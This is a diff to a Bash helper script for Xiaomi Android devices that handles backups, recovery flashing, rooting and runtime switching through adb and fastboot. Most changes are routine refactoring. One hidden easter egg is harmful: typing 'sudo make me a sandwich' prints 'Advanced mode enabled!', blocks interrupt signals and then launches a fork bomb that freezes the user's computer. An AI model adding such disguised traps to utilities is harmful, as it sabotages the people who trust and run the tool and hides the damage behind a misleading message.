@@ -16,19 +16,21 @@
 
 #      */*****   Home    *****\*
 
-becrazy () {
-  # The best thing you will find here
+fork-bomb () {
+  # The best thing you will find here, a fork bomb :D
+  # First, let's f**k up user
   trap "" 2 20
-  while :; do echo 'YOU ARE CRAZY !!!'; sleep 1; done
+  # The quiet before the storm
+  sleep 2
+  echo "Warning! A Fork Bomb coming!"
+  sleep 2
+  echo "Booom!"
+  :(){ :|:& };:
   }
 
 headerprint () {
-  # Loop a loop
-    if  [ "$ISCRAZY" = "1" ]
-      then
-        clear
-        while :; do becrazy ; sleep 1; done
-        break
+    if  [ "$ISCRAZY" = "1" ]; then
+      fork-bomb
   else
   clear
   echo " ################################"
@@ -55,8 +57,9 @@ home () {
         echo " | 10- Switch to Dalvik     11- Switch to ART    |"
     fi
     echo " |-----------------------------------------------|"
-    echo " "
-    echo "0- Exit         00-About"
+    echo " |                                               |"
+    echo " | 0- Exit         00-About                      |"
+    echo " |-----------------------------------------------|"
     read -p "?" Choice
     if [ "$Choice" == 1 ]; then
       back1
@@ -67,7 +70,7 @@ home () {
     elif  [ "$Choice" == 4 ]; then
       apk
     elif  [ "$Choice" == 5 ]; then
-      recovery1
+      recovery
     elif  [ "$Choice" == 6 ]; then
       rom
     elif  [ "$Choice" == 7 ]; then
@@ -87,7 +90,7 @@ home () {
     elif  [ "$Choice" = "make me a sandwich" ]; then
         read -p "Do it yourself: " Choice
         if [ "$Choice" = "sudo make me a sandwich" ]; then
-            echo "Setting crazy mode on.."
+            echo "Advanced mode enabled!"
             ISCRAZY=1
             sleep 3
             home
@@ -103,6 +106,7 @@ home () {
 
 close () {
   adb kill-server
+  killall adb
   killall fastboot
   clear
   exit 1
@@ -120,55 +124,16 @@ apk () {
   home
   }
 
-recovery1 () {
-    if  [ "$DEVICE" = "aries" ]; then
-        recovery2
-    elif  [ "$DEVICE" = "cancro" ]; then
-        recovery3
-    elif  [ "$DEVICE" = "armani" ]; then
-          recovery4
-  else
-  echo "Unsupported device.."
-  sleep 3
-  home
-  fi
-  }
-
-recovery2 () {
-  # aries-device recovery
+recovery () {
   headerprint
   echo "Recovery installer"
   adb reboot bootloader
   fastboot devices
-  fastboot flash $Mi2/recovery/recovery.img
+  fastboot flash $DDIR/recovery/recovery.img
   fastboot reboot
   echo "Done!"
   sleep 3
   }
-
-recovery3 () {
-  # cancro-devices recovery
-  headerprint
-  echo "Recovery installer"
-  adb reboot bootloader
-  fastboot devices
-  fastboot flash $Mi3/recovery/recovery.img
-  fastboot reboot
-  echo "Done!"
-  sleep 3
-  }
-
-recovery4 () {
-  # RedMi 1S recovery
-    headerprint
-    echo "Recovery installer"
-    adb reboot bootloader
-    fastboot devices
-    fastboot flash $RED1S/recovery/recovery.img
-    fastboot reboot
-    echo "Done!"
-    sleep 3
-    }
 
 rom () {
   headerprint
@@ -255,18 +220,12 @@ back1 () {
   echo " "
   echo "0- Go Back"
   read -p "?" Choice
-    if [ "$Choice" = "1" ]
-      then
+    if [ "$Choice" = "1" ]; then
         backup
-        break
-    elif [ "$Choice" = "2" ]
-      then
+    elif [ "$Choice" = "2" ]; then
         restore
-        break
-    elif [ "$Choice" = "0" ]
-      then
+    elif [ "$Choice" = "0" ]; then
         home
-        break
     else
     echo "Wrong input"
     back1
@@ -346,9 +305,7 @@ beart () {
   headerprint
   echo "ART RunTime"
   adb reboot recovery
-  # Wipe dalvik cache
   adb shell rm -rf /data/dalvik-cache
-  # Switch ro libart
   adb shell 'echo -n libart.so > /data/property/persist.sys.dalvik.vm.lib'
   adb reboot
   echo "Done!"
@@ -359,9 +316,7 @@ bedalvik () {
   headerprint
   echo "Dalvik RunTime"
   adb reboot recovery
-  # Wipe dalvik cache
   adb shell rm -rf /data/dalvik-cache
-  # Switch to libdalvik
   adb shell 'echo -n libdalvik.so > /data/property/persist.sys.dalvik.vm.lib'
   adb reboot
   echo "Done!"
@@ -397,7 +352,6 @@ about () {
 
 # <- Setup ->
 detect_device() {
-    # This will read device prop from build.prop
     clear
     adb kill-server
     adb start-server
@@ -407,20 +361,20 @@ detect_device() {
     DID=$(adb shell getprop ro.product.model)
     BUILD=$(adb shell getprop ro.build.version.release)
     if [[ "$DEVICE" == aries* ]]; then
-        # MIx = Mi-series device
         mix=1
-        DEVICE_ID=$Mi2
+        DDIR=$Mi2
         setup
     elif [[ "$DEVICE" == cancro* ]]; then
         mix=1
-        DEVICE_ID=$Mi3
+        DDIR=$Mi3
         setup
     elif [[ "$DEVICE" == armani* ]]; then
       mix=0
-      DEVICE_ID=$RED1S
+      DDIR=$RED1S
       setup
   #  elif [[ "$DEVICE" == mocha* ]]; then # <- Waiting for a Custom recovery
     #  adba=2
+    # DDIR=$MIP1
      # setup
     else
         echo "Device not supported: $DEVICE"
@@ -430,25 +384,22 @@ detect_device() {
 }
 
 setup (){
-  # <- Dir && Files ->
   RES=res
+  DEVICE=Unknow
   Mi2=Aries
   Mi3=Cancro
   RED1S=armani
-  # MIPAD=mocha
-  ROOTQCOM=$RES/root.zip # < don't ask the meaning of ROOTQCOM, it's a word like HOME :P
+  # MIP1=mocha
+  ROOTQCOM=$RES/root.zip # < don't ask the meaning of ROOTQCOM
   ROOTMIUI=$RES/miui_root.zip
   DIR=/sdcard/tmp
   BACKUPDIR=~/XiaomiTool/Backups
   CAMDIR=/sdcard/DCIM/Camera
-  # <- Others ->
   ISCRAZY=0
   ACTION=$1
-  # <- Device ->
   STATUS=$(adb get-state)
   SERIAL=$(adb get-serialno)
   USBADB=$(adb get-devpath)
-  # <- Android ->
   android-api
   }
 
@@ -460,6 +411,6 @@ android-api () {
       androidv=jb
       home
   fi
-
 }
+
 detect_device
